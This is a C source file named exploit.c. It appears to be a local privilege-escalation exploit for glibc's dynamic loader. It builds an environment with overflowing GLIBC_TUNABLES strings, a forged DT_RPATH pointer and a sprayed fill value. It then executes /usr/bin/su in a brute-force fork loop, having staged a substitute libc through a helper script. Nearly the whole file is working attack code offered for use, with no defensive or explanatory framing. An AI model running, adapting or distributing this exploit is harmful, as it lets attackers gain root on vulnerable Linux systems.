// gcc exploit.c -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

char *ljust(char *str, char value, size_t len);
char *padding(char *str, char value, size_t len);
int64_t *fill_i64(int64_t val, size_t len);

int main(void){
	if(access("GNU/libc.so.6", R_OK) && system("python3 prepare_lib.py PATH=GNU"))
		return -1;

	char *envp[0x100] = {};

	for(int i=0; i<sizeof(envp)/sizeof(char*)-1; i++)
		envp[i] = "";

	envp[0] = padding("GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=", 'A', 0x100-0x15);

	envp[1] = ljust("", 0xff, 13-1);
	envp[2+(0x40+15*8)] = (void*)(uint64_t[]){0x00007ffdffff1010}; // DT_RPATH:15

	envp[0xf0] = ljust("GLIBC_TUNABLES=", 'Z', 0xf0);

	char *rpath = (void*)fill_i64(-0xcac, 0x10000);
	for(int i=0; i<4; i++)
		envp[-i+0xfe] = rpath;

	//execve("/////usr/bin/su", (char*[]){"su", "-x", NULL}, envp);
	for(int try = 0;;try++){
		if(!(try % 100))
			printf("%d\n", try);

		switch(fork()){
			case -1:
				perror("fork");
				exit(1);
			case 0:
				execve("/////usr/bin/su", (char*[]){"su", "-x", NULL}, envp);
				perror("execve");
				exit(2);
			default:
			{
				int status;
				wait(&status);

				if(status!=11)
					printf("%d: (status:%d)\n", try, status);
				if(!status)
					return 0;
			}
		}
	}
}

char *ljust(char *str, char value, size_t len){
	char *ret;
	int orig_len = strlen(str);

	ret = malloc(len+1);
	memcpy(ret, str, orig_len);
	memset(ret+orig_len, value, len-orig_len);
	ret[len] = 0;

	return ret;
}

char *padding(char *str, char value, size_t len){
	char *ret;
	int orig_len = strlen(str);

	ret = malloc(orig_len+len+1);
	memcpy(ret, str, orig_len);
	memset(ret+orig_len, value, len);
	ret[orig_len+len] = 0;

	return ret;
}

int64_t *fill_i64(int64_t val, size_t len){
	int64_t *buf = malloc(len);
	for(int i=0; i<len/sizeof(int64_t); i++)
		buf[i] = val;
	((char*)buf)[len-1] = 0;

	return buf;
}

